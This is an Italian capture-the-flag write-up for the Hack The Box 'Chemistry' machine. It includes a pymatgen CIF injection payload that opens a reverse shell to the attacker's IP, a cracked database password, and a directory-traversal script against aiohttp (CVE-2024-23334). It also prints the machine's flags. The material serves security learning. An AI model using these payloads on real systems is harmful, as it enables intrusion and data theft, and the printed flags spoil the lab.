# Writeup: Chemistry

**Autore**: Luca Crippa  
**Data**: 2024-12-02

## Overview
- **Categoria**: Linux, Web
- **Difficoltà**: Intermedia
- **IP Target**: `10.10.11.38`
- **Servizi in Ascolto**:
  - **22/tcp**: SSH
  - **5000/tcp**: Web Application

## 1. Connessione al Servizio HTB
Dopo aver scaricato e configurato il file `.ovpn` per la VPN di Hack The Box, eseguiamo:
```bash
sudo openvpn --config lab_fazelucq.ovpn
```
Una volta connessi, identifichiamo l’indirizzo della macchina target, in questo caso `10.10.11.38`.

## 2. Scansione Nmap
Eseguiamo una scansione Nmap sull’host:
```bash
sudo nmap -sS 10.10.11.38
```
**Output**:
```
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
```
Sono presenti le porte **22** (SSH) e **5000** (servizio web).

## 3. Analisi del Servizio Web (Porta 5000)
Visitiamo `http://10.10.11.38:5000`. L’applicazione permette di registrarsi o loggarsi, e successivamente di caricare file in formato **CIF** (Crystallographic Information File).
![image](https://github.com/user-attachments/assets/e21f468b-8d74-4cf9-b7da-8fa42cfdffa8)
![image](https://github.com/user-attachments/assets/bc8b4268-fb2d-4817-9d73-d20b4ff877e4)



### 3.1 Reverse Shell tramite CIF
Analizzando la documentazione di **pymatgen**, scopriamo una vulnerabilità (documentata anche su GitHub) che permette l’esecuzione di codice arbitrario se si inserisce una linea particolare nel file `.cif`.



#### 3.1.1 Esempio di File `.cif`
```cif
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
```
Al file `.cif` legittimo aggiungiamo una riga contenente il payload di reverse shell, sfruttando la vulnerabilità:
```cif
_space_group_magn.transform_BNS_Pp_abc 'a,b,[d for d in ().__class__.__mro__[1].__getattribute__(* [().__class__.__mro__[1]]+["__sub" + "classes__"])() if d.__name__ == "BuiltinImporter"][0].load_module("os").system("/bin/bash -c \'sh -i >& /dev/tcp/10.10.14.37/4444 0>&1\'");0,0,0'
_space_group_magn.number_BNS 62.448
_space_group_magn.name_BNS "P n' m a' "
```
> **Nota**: Sostituire `10.10.14.37` con il proprio IP VPN e **4444** con la porta preferita.

#### 3.1.2 Avvio del Listener
Apriamo un listener sulla porta 4444:
```bash
nc -lvnp 4444
```

#### 3.1.3 Upload & Esecuzione
Carichiamo il file `.cif` modificato sul sito. Dopodiché, clicchiamo su **VIEW** per forzare l’analisi del file. Questo attiverà la vulnerabilità, inviandoci una reverse shell:

```bash
connect to [10.10.14.37] from (UNKNOWN) [10.10.11.38] 54562
sh: 0: can't access tty; job control turned off
$ whoami
app
```
Ora disponiamo di una shell come utente `app`.

## 4. Lettura del Database e Raccolta Credenziali
All’interno della home di `app`, troviamo `database.db`. Leggiamolo con:
```bash
cat /home/app/instance/database.db
```
Nel contenuto, scorgiamo varie credenziali con hash. Esempio:
```
Mrosa63ed86ee9f624c7b14f1d4f43dc251a5
...
```
![image](https://github.com/user-attachments/assets/e780446d-a465-4991-acce-85269029190a)

Confrontiamo l’hash su siti come [CrackStation](https://crackstation.net/) o usiamo `hashcat`. Otteniamo:
```
Mrosa: unicorniosrosados
```

## 5. Accesso come Rosa
Utilizziamo la password di `rosa` per connetterci via SSH:
```bash
ssh rosa@10.10.11.38
rosa@10.10.11.38's password: 
```
Siamo ora loggati come `rosa`.  
**Flag User**:  
```bash
cat /home/rosa/user.txt
08269138f937793e4f33369b7242a827
```

## 6. Privilege Escalation
Per ottenere i privilegi di root, analizziamo il sistema con **linpeas**. Notiamo un servizio in ascolto su `127.0.0.1:8080`.

![image](https://github.com/user-attachments/assets/d1a1804f-2887-4a1d-b871-254285605dfc)


### 6.1 Port Forwarding
Facciamo un tunnel locale:
```bash
sudo ssh -L 7000:127.0.0.1:8080 rosa@10.10.11.38 -fN
```
Ora `http://127.0.0.1:7000` ci mostra il servizio in esecuzione internamente su `8080`.

![image](https://github.com/user-attachments/assets/1ec8b47e-28a9-47f7-8ece-c27e13030e6d)


### 6.2 Directory Traversal Exploit (CVE-2024-23334)
Dai **header** notiamo `Python/3.9 aiohttp/3.9.1`, vulnerabile a un attacco di Directory Traversal. Eseguiamo uno script per tentare il traversal e leggere `root.txt`:

```bash
#!/bin/bash
url="http://127.0.0.1:7000"
string="../"
payload="/assets/"
file="root/root.txt" # senza lo slash iniziale

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```
Lo script incrementa i `../` finché non trova il file. Alla terza iterazione, otteniamo **200 OK** e il contenuto di `/root/root.txt`.

**Flag Root**:
```
8541882c7aedf25f17f8a1c8a24757ab
```

## Flag 🏁
- **User**: `08269138f937793e4f33369b7242a827`
- **Root**: `8541882c7aedf25f17f8a1c8a24757ab`

## Lezioni Apprese 📚
1. **Vulnerabilità in Formati di File**: Il caricamento di file `.cif` malformati ha consentito l’esecuzione di codice arbitrario.  
2. **Analisi di Database Interni**: Spesso le credenziali si trovano in chiaro o sotto forma di hash recuperabili.  
3. **Port Forwarding e Servizi Locali**: L’uso di SSH tunnel ci ha permesso di accedere a servizi interni (localhost:8080).  
4. **Directory Traversal**: Alcuni framework web possono essere vulnerabili a percorsi come `/assets/../../root.txt`.

## Tools Utilizzati 🛠️
- **OpenVPN**: Connessione a HTB  
- **Nmap**: Scansione delle porte  
- **pymatgen**: Ricerca della vulnerabilità CIF  
- **Reverse Shell**: `nc -lvnp 4444`  
- **Linpeas**: Privilege Escalation Analysis  
- **SSH Tunnel**: Forwarding della porta 8080  
- **CURL**: Directory Traversal

---

*Writeup by Luca Crippa - Last Updated: 2024*
